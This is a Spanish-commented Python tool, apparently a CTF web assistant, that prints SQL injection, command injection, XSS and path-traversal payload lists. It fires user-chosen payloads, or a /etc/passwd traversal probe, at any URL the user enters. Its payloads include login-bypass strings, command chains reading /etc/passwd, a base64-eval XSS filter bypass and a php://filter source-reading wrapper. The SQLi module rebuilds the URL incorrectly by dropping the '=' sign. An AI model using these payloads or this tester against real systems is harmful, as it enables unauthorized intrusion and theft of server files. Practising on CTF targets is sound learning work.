# ctfassistant/main.py
# -*- coding: utf-8 -*-

import os
import sys
import requests
from bs4 import BeautifulSoup 
import urllib.parse # Ya estaba importado implícitamente por requests.utils.quote

# -----------------------------------------------
# MÓDULOS DE PAYLOADS
# -----------------------------------------------

def show_sqli_payloads():
    """Muestra y explica los payloads de SQLi más comunes."""
    payloads = {
        # Payloads Clásicos y para Adivinar el Número de Columnas
        "1. Pruebas de Citas/Comentarios": ["' --", "') --", "'; --", '") --', '" --", "') or 1=1 --"],
        
        # Pruebas de Bypass de Autenticación
        "2. Bypass de Login (True Always)": ["' OR 1=1 --", "' OR '1'='1 --", "' OR 'a'='a' --"],
        
        # Pruebas para Adquirir Información (UNION-Based)
        "3. UNION Básica (Contar Columnas)": [
            " ORDER BY N -- (Sustituye N por 1, 2, 3... hasta que falle para contar)",
            " UNION SELECT 1,2,3,4,5 -- (Ejemplo para 5 columnas, ajusta los números)"
        ],
    }

    print("\n[📚] PAYLOADS DE SQL INJECTION RECOMENDADOS [📚]")
    print("--------------------------------------------------")
    print("💡 **Objetivo:** Copia estos payloads y pégalos en tu parámetro de URL.")
    print("   Observa la respuesta: ¿Hay error? ¿Cambia el contenido?\n")

    for category, payload_list in payloads.items():
        print(f"**{category}**")
        for p in payload_list:
            print(f"   -> {p}")
        print("-" * 15)


def show_command_payloads():
    """Muestra los payloads de Command Injection más comunes para Linux."""
    payloads = {
        # Separadores Comunes
        "1. Separadores de Comandos": [
            "&",         # Ejecuta el comando anterior y luego el nuevo
            "&&",        # Ejecuta el nuevo SOLO si el anterior fue exitoso
            "|",         # Pipe: Manda la salida del anterior al nuevo
            ";"          # Simple separador de comandos
        ],
        
        # Comandos de Prueba (Reemplaza 'TARGET' con '127.0.0.1' o una entrada válida)
        "2. Inyección Clásica (Ejemplos)": [
            "TARGET; ls -la",
            "TARGET && cat /etc/passwd",
            "`whoami`"  # Backticks (alt-96)
        ],
    }

    print("\n[📚] PAYLOADS DE COMMAND INJECTION (LINUX) [📚]")
    print("--------------------------------------------------")
    print("💡 **Objetivo:** Inserta estos payloads en el campo de entrada vulnerable.\n")

    for category, payload_list in payloads.items():
        print(f"**{category}**")
        for p in payload_list:
            print(f"   -> {p}")
        print("-" * 15)


def show_xss_payloads():
    """Muestra los payloads XSS más comunes para diferentes escenarios."""
    payloads = {
        # Clásico Reflected XSS (Prueba principal)
        "1. XSS Básico (Sin Filtros)": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>"
        ],
        
        # Bypass de Filtros Comunes (Si se filtra 'script' o '<')
        "2. Bypass de Etiquetas/Comillas": [
            "';alert(1)//", # Cerrar comillas simples y comentar
            "')alert(1)//", # Cerrar comillas dobles y paréntesis
            "<a onmouseover=alert(1)>XSS</a>" # Usar eventos de ratón
        ],
        
        # Bypass de 'alert' (Si se filtra la palabra 'alert')
        "3. Bypass de Funciones (Ej: 'alert' filtrado)": [
            "<img src=x onerror=window.onload=function(){eval(atob('YWxlcnQoMSk='))}>" # Codificación Base64
        ],
    }

    print("\n[📚] PAYLOADS DE XSS RECOMENDADOS [📚]")
    print("------------------------------------------")
    print("💡 **Objetivo:** Inyecta estos payloads y busca la reflexión en el HTML.")
    print("   El éxito se verifica si el payload inyectado aparece en la respuesta.\n")

    for category, payload_list in payloads.items():
        print(f"**{category}**")
        for p in payload_list:
            print(f"   -> {p}")
        print("-" * 15)

def show_lfi_payloads():
    """Muestra los payloads de LFI/Path Traversal más comunes."""
    payloads = {
        # Payloads para Linux (el más común)
        "1. Archivo Objetivo: /etc/passwd": [
            "../../../../../etc/passwd", 
            "....//....//....//....//etc/passwd", # Doble URL Encoding Bypass
            "/etc/passwd%00" # Null Byte (antiguamente útil para terminar la cadena)
        ],
        
        # Payloads para Windows (menos común en CTF web)
        "2. Archivo Objetivo: Windows System": [
            "..\..\..\..\windows\system32\drivers\etc\hosts",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/windows/system32/drivers/etc/hosts" # Unicode Encoding
        ],

        # Wrapper (Si solo acepta archivos locales)
        "3. PHP Filter Wrapper": [
            "php://filter/read=convert.base64-encode/resource=index.php" # Leer el código fuente de index.php
        ]
    }

    print("\n[📚] PAYLOADS DE LFI / PATH TRAVERSAL [📚]")
    print("------------------------------------------")
    print("💡 **Objetivo:** Tratar de leer archivos del sistema (ej: /etc/passwd).\n")

    for category, payload_list in payloads.items():
        print(f"**{category}**")
        for p in payload_list:
            print(f"   -> {p}")
        print("-" * 15)


# -----------------------------------------------
# MÓDULOS DE HERRAMIENTAS
# -----------------------------------------------

def tool_sqli():
    """Herramienta principal de SQL Injection."""
    print("\n[🛠️] Módulo: SQL Injection (SQLi)")
    print("---------------------------------")
    
    target_url = input("Ingresa la URL objetivo (ej: http://ejemplo.com/pagina.php?id=1): ")
    
    if "=" not in target_url:
        print("⚠️ Advertencia: La URL no parece tener un parámetro (ej: ?id=1).")
        input("Presiona ENTER para continuar y ver los Payloads...")
        
    print(f"\n[🔗] URL Objetivo: {target_url}")
    print("---------------------------------")

    show_sqli_payloads()
    
    try_payload = input("\n¿Quieres probar un payload inmediatamente? (S/N): ").strip().upper()

    if try_payload == 'S':
        payload = input("Ingresa el payload que quieres probar (ej: ' OR 1=1 --): ")
        
        if '=' in target_url:
            # Usar urllib.parse.urljoin para manejar la ruta base y el payload, aunque
            # para payloads inyectados al final de un parámetro, la concatenación simple es común.
            base_url, _ = target_url.rsplit('=', 1)
            full_url = f"{base_url}{payload}" # Concatenamos directamente
            
            print(f"\n[🚀] Probando URL: {full_url}")
            
            try:
                response = requests.get(full_url, timeout=10)
                
                print(f"[*] Código de Estado HTTP: {response.status_code}")
                
                if response.status_code != 200:
                    print("🚨 Alerta: El Código de Estado NO es 200 (OK). Podría indicar un error.")
                
                print("\n[🔍] Primeras 20 líneas de la Respuesta del Servidor:")
                content_lines = response.text.splitlines()
                for line in content_lines[:20]:
                    print(line.strip()[:100])
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Error al conectar con la URL: {e}")
                
        else:
            print("❌ No se pudo insertar el payload automáticamente. Por favor, hazlo manualmente.")

    print("\n[✅] Análisis de SQLi completado. ¡Usa los resultados para el siguiente paso!")
    input("\nPresiona ENTER para volver al menú de Inyección...")


def tool_command_injection():
    """Herramienta principal de Command Injection."""
    print("\n[🛠️] Módulo: Command Injection")
    print("-------------------------------")
    
    target_url = input("Ingresa la URL objetivo (ej: http://ejemplo.com/ping.php?host=127.0.0.1): ")
    
    if "=" not in target_url:
        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
        input("Presiona ENTER para continuar y ver los Payloads...")

    print(f"\n[🔗] URL Objetivo: {target_url}")
    print("---------------------------------")
    
    show_command_payloads()
    
    try_payload = input("\n¿Quieres probar un payload inmediatamente? (S/N): ").strip().upper()
    
    if try_payload == 'S':
        payload = input("Ingresa el payload COMPLETO a enviar (ej: 127.0.0.1; whoami): ")
        
        if '=' in target_url:
            base_url, _ = target_url.rsplit('=', 1)
            full_url = f"{base_url}={urllib.parse.quote(payload)}" # Codificamos el payload para la URL
            
            print(f"\n[🚀] Probando URL: {full_url}")
            
            try:
                response = requests.get(full_url, timeout=10)
                
                print(f"[*] Código de Estado HTTP: {response.status_code}")
                
                print("\n[🔍] Primeras 20 líneas de la Respuesta del Servidor:")
                content_lines = response.text.splitlines()
                for line in content_lines[:20]:
                    print(line.strip()[:100])
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Error al conectar con la URL: {e}")
                
        else:
            print("❌ No se pudo insertar el payload automáticamente. Por favor, hazlo manualmente.")

    print("\n[✅] Análisis de Command Injection completado. ¡Busca la salida de tu comando!")
    input("\nPresiona ENTER para volver al menú de Inyección...")


def tool_xss():
    """Herramienta principal para XSS Payload Generator & Tester."""
    print("\n[🛠️] Módulo: XSS Payload Generator & Tester")
    print("------------------------------------------")
    
    # 1. Recolección de Datos
    target_url = input("Ingresa la URL objetivo con el parámetro (ej: http://ejemplo.com/search.php?q=TEST): ")
    
    if "=" not in target_url:
        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
        input("Presiona ENTER para continuar y ver los Payloads...")

    print(f"\n[🔗] URL Objetivo: {target_url}")
    print("---------------------------------")
    
    show_xss_payloads()
    
    # 2. Prueba rápida del payload
    try_payload = input("\n¿Quieres probar un payload inmediatamente? (S/N): ").strip().upper()
    
    if try_payload == 'S':
        # Usaremos un payload de prueba simple y codificado para URL
        test_payload_raw = "XSS_TEST_MARKER" # Marcador simple para búsqueda
        
        if '?' in target_url and '=' in target_url:
            # Dividir la URL y usar el marcador
            base_url, _ = target_url.rsplit('=', 1)
            # Codificar el payload para que pase en la URL sin romper la petición
            test_payload_encoded = urllib.parse.quote(test_payload_raw)
            full_url = f"{base_url}={test_payload_encoded}"
            
            print(f"\n[🚀] Probando URL: {full_url}")
            
            try:
                response = requests.get(full_url, timeout=10)
                
                print(f"[*] Código de Estado HTTP: {response.status_code}")
                
                # 3. Análisis de la Respuesta
                # Buscamos el marcador en el texto plano de la respuesta
                if test_payload_raw in response.text:
                    print("\n[✅] ¡ÉXITO! El marcador de prueba (XSS_TEST_MARKER) fue reflejado en la página.")
                    print("   Ahora puedes intentar inyectar tus payloads de XSS.")
                    
                    # Intentar mostrar dónde se reflejó (una pequeña porción)
                    start_index = response.text.find(test_payload_raw)
                    if start_index != -1:
                        # Muestra 30 caracteres antes y 30 después
                        context = response.text[max(0, start_index - 30): start_index + len(test_payload_raw) + 30]
                        print("\n[🔍] Contexto de Reflexión (Buscando la etiqueta):")
                        print("--------------------------------------------------")
                        print(context.strip())
                else:
                    print("\n[❌] FALLO. El marcador de prueba NO fue encontrado en la respuesta.")
                    print("   El parámetro podría no ser vulnerable a XSS reflejado.")
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Error al conectar con la URL: {e}")
                
        else:
            print("❌ La URL debe contener un parámetro (ej: ?q=valor) para la prueba automática.")

    print("\n[✅] Análisis de XSS completado. ¡A inyectar los payloads! 💉")
    input("\nPresiona ENTER para volver al Menú Principal...")


def tool_lfi():
    """Herramienta para Local File Inclusion (LFI) / Path Traversal."""
    print("\n[🛠️] Módulo: LFI / Path Traversal")
    print("---------------------------------")
    
    # 1. Recolección de Datos
    target_url = input("Ingresa la URL objetivo con el parámetro (ej: http://ejemplo.com/page.php?file=index.php): ")
    
    if "=" not in target_url:
        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
        input("Presiona ENTER para continuar y ver los Payloads...")

    print(f"\n[🔗] URL Objetivo: {target_url}")
    print("---------------------------------")
    
    show_lfi_payloads()
    
    # 2. Prueba de /etc/passwd
    try_payload = input("\n¿Quieres probar el payload CLÁSICO de /etc/passwd? (S/N): ").strip().upper()
    
    if try_payload == 'S':
        # Payload clásico de 6 niveles para salir de la estructura del servidor
        test_payload_raw = "../../../../etc/passwd" 
        
        if '?' in target_url and '=' in target_url:
            # Dividir la URL
            base_url, _ = target_url.rsplit('=', 1)
            # Codificar el payload (esto cambia los slashes)
            test_payload_encoded = urllib.parse.quote(test_payload_raw)
            full_url = f"{base_url}={test_payload_encoded}"
            
            print(f"\n[🚀] Probando URL: {full_url}")
            
            try:
                response = requests.get(full_url, timeout=10)
                
                print(f"[*] Código de Estado HTTP: {response.status_code}")
                
                # 3. Análisis de la Respuesta
                # Buscamos la estructura del archivo /etc/passwd
                if "root:" in response.text or "daemon:" in response.text:
                    print("\n[✅] ¡VULNERABILIDAD CONFIRMADA! La página muestra el contenido de /etc/passwd.")
                    print("   ¡Ahora puedes leer otros archivos importantes del sistema!")
                    
                    print("\n[🔍] Contenido de /etc/passwd (Primeras 5 líneas):")
                    passwd_lines = [line for line in response.text.splitlines() if ':' in line and len(line) > 10]
                    for line in passwd_lines[:5]:
                         print(line.strip()[:100])
                else:
                    print("\n[❌] FALLO. El contenido de /etc/passwd NO fue encontrado.")
                    print("   Intenta codificar el payload de forma diferente o cambiar el archivo objetivo.")
                    
            except requests.exceptions.RequestException as e:
                print(f"❌ Error al conectar con la URL: {e}")
                
        else:
            print("❌ La URL debe contener un parámetro (ej: ?file=) para la prueba automática.")

    print("\n[✅] Análisis de LFI completado. ¡A buscar archivos!")
    input("\nPresiona ENTER para volver al Menú Principal...")


# -----------------------------------------------
# MENÚS Y LÓGICA PRINCIPAL
# -----------------------------------------------

def show_injection_menu():
    """Muestra el submenú para las herramientas de Inyección."""
    while True:
        # os.system('clear') # Limpia la pantalla, útil en Kali <--- COMENTADO PARA COMPATIBILIDAD
        print("╔══════════════════════════════════════════╗")
        print("║        [1] MENÚ DE INYECCIÓN             ║")
        print("╠══════════════════════════════════════════╣")
        print("║ 1. SQL Injection (SQLi) Tool             ║")
        print("║ 2. Command Injection Tool                ║")
        print("║ 9. Volver al Menú Principal              ║")
        print("╚══════════════════════════════════════════╝")
        
        choice = input("Selecciona una opción o (Ctrl+C para salir): ")
        
        if choice == '1':
            tool_sqli()
        elif choice == '2':
            tool_command_injection()
        elif choice == '9':
            break
        else:
            print("Opción no válida. Inténtalo de nuevo.")
            
def main_menu():
    """Muestra el menú principal de la herramienta."""
    while True:
        try:
            # os.system('clear') # Limpia la pantalla <--- COMENTADO PARA COMPATIBILIDAD
            print("╔══════════════════════════════════════════╗")
            print("║     [🔥] CTF WEB ASSISTANT [🔥]          ║")
            print("╠══════════════════════════════════════════╣")
            print("║ 1. Inyección (SQLi, Command Injection)   ║")
            print("║ 2. Cross-Site Scripting (XSS)            ║")
            print("║ 3. Análisis de Archivos (LFI/Traversal)  ║")
            print("║ 4. Salir (Ctrl+C también funciona)       ║")
            print("╚══════════════════════════════════════════╝")
            
            choice = input("Selecciona una opción: ")
            
            if choice == '1':
                show_injection_menu()
            elif choice == '2':
                tool_xss()
            elif choice == '3':
                tool_lfi() # Llama a la función tool_lfi
            elif choice == '4':
                print("\n¡Éxito en tus retos! ¡Hasta pronto! 👋")
                sys.exit(0)
            else:
                print("Opción no válida. Inténtalo de nuevo.")

        except KeyboardInterrupt:
            # Maneja la salida con Ctrl+C
            print("\n\n¡Herramienta finalizada! ¡Buena suerte! 🚀")
            sys.exit(0)
            
        except Exception as e:
            # Quitamos el print de error para evitar el error de codificación si falla
            print(f"\nOcurrió un error inesperado (Detalles: {e}).") 
            input("Presiona ENTER para volver al menú...")

def main():
    """Función de entrada principal."""
    main_menu()

if __name__ == "__main__":
    main()
